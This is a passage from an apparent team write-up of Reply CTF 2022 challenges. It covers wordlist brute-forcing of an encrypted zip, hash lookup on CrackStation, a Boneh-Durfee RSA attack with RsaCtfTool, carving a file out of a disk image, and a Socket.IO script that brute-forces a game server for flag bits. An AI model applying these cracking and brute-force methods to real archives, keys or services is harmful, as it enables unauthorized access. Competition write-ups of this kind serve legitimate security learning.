<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">screw</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">ball</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">troublemaker</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">trouble</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">maker</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">ddrussery</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">marselmannanov</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">t2003cubs</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">mojdom</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">joechu</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">michadav</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">n96237d</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">barbyoropeza</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">shaneyreid91</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">assuero</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">pawol69087</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">cityve</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">mudraporko</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">lucumazu</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">nusavufi</span><span style="color:#C98A7D77">'</span></span>
<span class="line"><span style="color:#666666">]</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">delimiters </span><span style="color:#666666">=</span><span style="color:#666666"> [</span><span style="color:#C98A7D77">''</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D77"> '</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">-</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">_</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">.</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">,</span><span style="color:#C98A7D77">'</span><span style="color:#666666">]</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> w </span><span style="color:#4D9375">in</span><span style="color:#DBD7CAEE"> words</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">    for</span><span style="color:#DBD7CAEE"> d </span><span style="color:#4D9375">in</span><span style="color:#DBD7CAEE"> delimiters</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">        try</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">            with</span><span style="color:#DBD7CAEE"> pyzipper</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">AESZipFile</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">rsa.zip</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span><span style="color:#4D9375"> as</span><span style="color:#DBD7CAEE"> f</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">                f</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">pwd </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> w</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#666666">()</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> d</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#666666">()</span><span style="color:#CB7676"> +</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">unitt</span><span style="color:#C98A7D77">'</span></span>
<span class="line"><span style="color:#B8A965">                print</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">f</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">pwd</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#758575DD">                # print(f.infolist())</span></span>
<span class="line"><span style="color:#B8A965">                print</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">f</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">read</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">ciphertext.txt</span><span style="color:#C98A7D77">'</span><span style="color:#666666">))</span></span>
<span class="line"><span style="color:#4D9375">        except</span><span style="color:#B8A965"> RuntimeError</span><span style="color:#4D9375"> as</span><span style="color:#DBD7CAEE"> e</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#758575DD">            # print(e)</span></span>
<span class="line"><span style="color:#4D9375">            pass</span></span>
<span class="line"></span></code></pre>
<p>But no combination we tried would successfully decrypt the zip file.
Since this is a Reply crypto challenge with no source code, we tried reversing the password hashes we found in the sqlite file on CrackStation, and we hit a match on one.</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>sha256('alessio') = "8d0cfd6182ef851052565eb5c11e79f73c691307f7b6ddb877b4303cc726f260"</span></span>
<span class="line"><span></span></span></code></pre>
<p>So we tried “alessiounitt” as the zip password and it worked.
Inside <code>rsa.zip</code> we saw two files: <code>ciphertext.txt</code>:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>0x3fb45bf4009bde3dad01054910efab2f9052ae049d4d770cc0255f33aafbc6c2a51a3d987ff77dff27ba0ff0e0098fdaed44c0d140923c577105c4a79623483293ecf2dfa6cd1ead8a2bd3a748aa167c83d532dcdc15fa93705fd866b8c5e86e311840f0fe589326b1a2c49712e818be237951d1503129253c7a8c246db3af132</span></span>
<span class="line"><span></span></span></code></pre>
<p>and an RSA public key.</p>
<p>Reading the keys, the first thing we noticed was that <code>e</code> was big, this means that <code>d</code> might be small.
So we tried to break the key with the Boneh-Durfee attack:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>RsaCtfTool --publickey key.pub --dumpkey --private --attack boneh_durfee</span></span>
<span class="line"><span></span></span></code></pre>
<p>and it worked!</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>d: 5752477793961718316974364565722959866214021715252358015981092755839491056537</span></span>
<span class="line"><span>p: 20659222008512759831277682223795162680334385991854286283853960400286241695014333963737657226297951042993329540999035446587802842157029340511729302434748273</span></span>
<span class="line"><span>q: 38676882448094023590775144095087527526209199110085295247166619083834674380076580348153808072855754145097868212826481975496548251654863618859218700354289311</span></span>
<span class="line"><span></span></span></code></pre>
<p>And we easily got the flag with:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>RsaCtfTool --publickey key.pub --uncipherfile enc --attack boneh_durfee</span></span>
<span class="line"><span></span></span></code></pre>
<h2 id="misc-45">Misc (4/5)</h2>
<h3 id="misc-100">Misc 100</h3>
<p>The challenge comes with a disk image file and a password for some reason.</p>
<p>The mounted disk image is empty.</p>
<p>Since this is a misc challenge, I  ran <code>strings</code> on it. <code>strings</code> returns gibberish and some interesting trash info:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>[...]</span></span>
<span class="line"><span>[Trash Info]</span></span>
<span class="line"><span>Path=00033616.png</span></span>
<span class="line"><span>DeletionDate=2022-10-05T10:49:29</span></span>
<span class="line"><span>[Trash Info]</span></span>
<span class="line"><span>Path=myfile.zip</span></span>
<span class="line"><span>DeletionDate=2022-10-05T10:49:29</span></span>
<span class="line"><span>[...]</span></span>
<span class="line"><span></span></span></code></pre>
<p>Since this is a misc challenge, I ran <code>binwalk</code> on it. <code>binwalk</code> sucks and returned nothing useful.</p>
<p>Knowing that I’m probably looking for a zip file (I need to use that password somehow), I just opened the image file in an hex editor and looked for <code>PK</code>, the magic bytes for zip files. I found a small sequence of bytes that looked like a valid file.</p>
<p>I copied and pasted that sequence to a new file, and opened our brand new zip archive with the password in the description. The extracted file is a text file with the flag.</p>
<h3 id="misc-200">Misc 200</h3>
<p>The challenge description gives a host and an UDP port.</p>
<p>Sending some requests and doing some tests show that:</p>
<ul>
<li>The service is an echo server: text sent to it is sent back in multiple datagrams, one per text character.</li>
<li>The echo back is capped to 108 characters.</li>
<li>Multiple requests start separate sequences of 108 datagrams.</li>
</ul>
<p>Since this is a misc challenge, I looked at the challenge description for guessing inspiration. The title says “hIP hIP”, so it’s probably related to the IP header.</p>
<p>Using Wireshark, I found out that the IP Identification field in the echo datagrams is always set to one of <code>0x3fff</code>, <code>0x7fff</code>, <code>0xbfff</code>, <code>0xffff</code>, when it’s supposed to be random. I can tell that only the first 2 bits change, so it’s probably exfiltrating some data 2 bits at a time. 2 bits * 108 datagrams = 216 bits = 27 bytes for the flag probably.</p>
<p>I dumped 108 Identification fields from Wireshark to a text field, filtered out the first two bits in Python, and finally copy-pasted the result in a binary to text converter to get the flag.</p>
<h3 id="misc-300">Misc 300</h3>
<p>![REPLINO GAME screenshot]({{ site.baseurl }}/writeup_files/reply2022/images/e3KB4XT.png)</p>
<p>The challenge is a game similar to Chrome’s dino game, where there are obstacles that you have to jump over or slide under.</p>
<p>It’s a simple HTML5 game, communicating to the server via<code>Socket.IO</code>.</p>
<p>We can see that within the <code>main.js</code> file:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:#CB7676">const</span><span style="color:#BD976A"> socket</span><span style="color:#666666"> =</span><span style="color:#80A665"> io</span><span style="color:#666666">({</span><span style="color:#B8A965">path</span><span style="color:#666666">:</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">/b7f91f2e6e12123b14fdfa9187ea53af00f281ac/socket.io</span><span style="color:#C98A7D77">"</span><span style="color:#666666">});</span></span>
<span class="line"></span></code></pre>
<p>We then search where the game could send data to the server, as the flag was not in the client.</p>
<p>We found the following code that emit an event to the <code>socket</code>:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:#BD976A">socket</span><span style="color:#666666">.</span><span style="color:#80A665">emit</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">action</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#B8A965">    px</span><span style="color:#666666">:</span><span style="color:#BD976A"> action</span><span style="color:#666666">.</span><span style="color:#BD976A">x</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#B8A965">    ox</span><span style="color:#666666">:</span><span style="color:#BD976A"> action</span><span style="color:#666666">.</span><span style="color:#BD976A">ox</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#B8A965">    speed</span><span style="color:#666666">:</span><span style="color:#C99076"> this</span><span style="color:#666666">.</span><span style="color:#BD976A">speed</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#B8A965">    seed</span><span style="color:#666666">:</span><span style="color:#BD976A"> seed</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#B8A965">    step</span><span style="color:#666666">:</span><span style="color:#C99076"> this</span><span style="color:#666666">.</span><span style="color:#BD976A">step</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#B8A965">    type</span><span style="color:#666666">:</span><span style="color:#BD976A"> action</span><span style="color:#666666">.</span><span style="color:#BD976A">type</span></span>
<span class="line"><span style="color:#666666">});</span></span>
<span class="line"></span></code></pre>
<p>This corresponds to the traffic intercepted with Burp Suite (or inside the “Network” tab in the Devtools):</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>42["action",{"px":20.17500000000004,"ox":108.35000000000493,"speed":3.9999999999999787,"seed":2.2930437633190137,"step":0,"type":"J"}]</span></span>
<span class="line"><span></span></span></code></pre>
<p>The server replies with:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>42["actionresponse","A"]</span></span>
<span class="line"><span></span></span></code></pre>
<p>Uhm, <code>actionresponse</code> is never mentioned in the code, so the game never processes it. Let’s try playing some more.</p>
<p>After playing a little bit, we noticed that sometimes the server replied with <code>actionresponse: 0</code> and <code>actionresponse: 1</code>.</p>
<p>We guessed that a bit may have been transmitted with each command.</p>
<p>Let’s write a simple script that allow us to send commands without playing the game:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#758575DD">#!/usr/bin/env python3</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> socketio</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">sio </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> socketio</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">Client</span><span style="color:#666666">()</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">aaa </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> ""</span></span>
<span class="line"></span>
<span class="line"><span style="color:#666666">@</span><span style="color:#80A665">sio</span><span style="color:#666666">.</span><span style="color:#80A665">on</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">*</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> catch_all</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">event</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> data</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#CB7676">    global</span><span style="color:#DBD7CAEE"> aaa</span></span>
<span class="line"><span style="color:#DBD7CAEE">    aaa </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> data</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#666666">@</span><span style="color:#80A665">sio</span><span style="color:#666666">.</span><span style="color:#80A665">event</span></span>
<span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> connect</span><span style="color:#666666">():</span></span>
<span class="line"><span style="color:#B8A965">    print</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">I'm connected!</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#666666">@</span><span style="color:#80A665">sio</span><span style="color:#666666">.</span><span style="color:#80A665">event</span></span>
<span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> disconnect</span><span style="color:#666666">():</span></span>
<span class="line"><span style="color:#B8A965">    print</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">I'm disconnected!</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">sio</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">connect</span><span style="color:#666666">(</span></span>
<span class="line"><span style="color:#C98A7D77">    "</span><span style="color:#C98A7D">http://gamebox1.reply.it/</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#BD976A">    socketio_path</span><span style="color:#666666">=</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">b7f91f2e6e12123b14fdfa9187ea53af00f281ac/socket.io</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#B8A965">print</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">my sid is</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> sio</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sid</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">flag </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> ""</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> x </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#4C9A91">1000</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">    sio</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">emit</span><span style="color:#666666">(</span></span>
<span class="line"><span style="color:#C98A7D77">        "</span><span style="color:#C98A7D">action</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#666666">        {</span></span>
<span class="line"><span style="color:#C98A7D77">            "</span><span style="color:#C98A7D">px</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span><span style="color:#4C9A91"> 18.76000000000007</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">            "</span><span style="color:#C98A7D">ox</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span><span style="color:#4C9A91"> 138.82000000000716</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">            "</span><span style="color:#C98A7D">speed</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span><span style="color:#4C9A91"> 5.6499999999999435</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">            "</span><span style="color:#C98A7D">seed</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span><span style="color:#4C9A91"> 0.6468621828291544</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">            "</span><span style="color:#C98A7D">step</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span><span style="color:#DBD7CAEE"> x</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">            "</span><span style="color:#C98A7D">type</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">J</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#666666">        },</span></span>
<span class="line"><span style="color:#666666">    )</span></span>
<span class="line"></span></code></pre>
<p>Now we can obtain strings that looked like these:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>011AAA110AAAA11AAAA01AAAA100AAAA00AAAA10AAAA110AAA111AAAA10AAAA10AAAA101AAAA01AAAA10AAAA011AAA110AAAA01AAAA10AAAA111AAAA01AAAA10AAAA011AAA101AAAA11AAAA10AAAA101AAAA00AAAA11AAAA010AAA100AAAA01AAAA00AAAA011AAAA01AAAA11AAAA110AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span></span>
<span class="line"><span></span></span>
<span class="line"><span>AA1A1AAA0A0AAA1AA1AAAAA0AAA0A1AAA0A1AAA0AA1AAA0A0AAA1A0AAA0AA0AAAAA1AAA1A0AAA1A0AAA0AA0AAA1A0AAA0A0AAA1AA1AA0AA1AAA1A0AAA1A0AAA0AA0AAA1A0AAA1A0AAA1AA1AA0AA0AAA1A0AAA0A1AAA1AA0AAA0A0AAA0A1AAA1AAAAA0AA1AAA1A1AAA1A0AAA1AA1AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span></span>
<span class="line"><span></span></span></code></pre>
<p>We noticed that the numbers matched between the strings and they stopped appearing after a while, so this could be our flag.</p>
<p>How does a flag start? With <code>{FLG:</code>, which converted to binary is <code>0111101101000110010011000100011100111010</code></p>
<p>Some bits match! Looking good so far.</p>
<p>After that, we tried to bruteforce it, generating random speed values until we found a valid bit:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#758575DD">#!/usr/bin/env python3</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> random</span></span>
<span class="line"><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> socketio</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">sio </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> socketio</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">Client</span><span style="color:#666666">()</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#666666">@</span><span style="color:#80A665">sio</span><span style="color:#666666">.</span><span style="color:#80A665">event</span></span>
<span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> connect</span><span style="color:#666666">():</span></span>
<span class="line"><span style="color:#B8A965">    print</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">I'm connected!</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#666666">@</span><span style="color:#80A665">sio</span><span style="color:#666666">.</span><span style="color:#80A665">event</span></span>
<span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> disconnect</span><span style="color:#666666">():</span></span>
<span class="line"><span style="color:#B8A965">    print</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">I'm disconnected!</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#666666">@</span><span style="color:#80A665">sio</span><span style="color:#666666">.</span><span style="color:#80A665">on</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">actionresponse</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> on_message</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">data</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#CB7676">    global</span><span style="color:#DBD7CAEE"> bit</span></span>
<span class="line"><span style="color:#DBD7CAEE">    bit </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> data</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">sio</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">connect</span><span style="color:#666666">(</span></span>
<span class="line"><span style="color:#C98A7D77">    "</span><span style="color:#C98A7D">http://gamebox1.reply.it/</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#BD976A">    socketio_path</span><span style="color:#666666">=</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">b7f91f2e6e12123b14fdfa9187ea53af00f281ac/socket.io</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">flag </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> ""</span></span>
<span class="line"><span style="color:#DBD7CAEE">bit </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">A</span><span style="color:#C98A7D77">"</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> x </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#4C9A91">224</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#4D9375">    while</span><span style="color:#DBD7CAEE"> bit </span><span style="color:#CB7676">==</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">A</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">        sio</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">call</span><span style="color:#666666">(</span></span>
<span class="line"><span style="color:#C98A7D77">            "</span><span style="color:#C98A7D">action</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#666666">            {</span></span>
<span class="line"><span style="color:#C98A7D77">                "</span><span style="color:#C98A7D">px</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span><span style="color:#4C9A91"> 18.76000000000007</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">                "</span><span style="color:#C98A7D">ox</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span><span style="color:#4C9A91"> 138.82000000000716</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">                "</span><span style="color:#C98A7D">speed</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span><span style="color:#DBD7CAEE"> random</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">random</span><span style="color:#666666">()</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 10</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">                "</span><span style="color:#C98A7D">seed</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span><span style="color:#DBD7CAEE"> random</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">random</span><span style="color:#666666">()</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 2</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 3.14</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">                "</span><span style="color:#C98A7D">step</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span><span style="color:#DBD7CAEE"> x</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">                "</span><span style="color:#C98A7D">type</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span><span style="color:#DBD7CAEE"> random</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">choice</span><span style="color:#666666">([</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">J</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">C</span><span style="color:#C98A7D77">"</span><span style="color:#666666">]),</span></span>
<span class="line"><span style="color:#666666">            },</span></span>
<span class="line"><span style="color:#666666">        )</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">    flag </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> bit</span></span>
<span class="line"><span style="color:#DBD7CAEE">    bit </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">A</span><span style="color:#C98A7D77">"</span></span>
<span class="line"><span style="color:#B8A965">    print</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">flag</span><span style="color:#666666">)</span></span>
<span class="line"></span></code></pre>
<p>After waiting for it to complete, we got the following binary string:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>01111011010001100100110001000111001110100110110101111001010100010111010100110100011001000111001101000010011101010111001001101110010001110110100101101101011011010011001100110100010000100111001001100101001101000110101101111101</span></span>
<span class="line"><span></span></span></code></pre>
<p>And after converting it, we got the flag:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>{FLG:myQu4dsBurnGimm34Bre4k}</span></span>
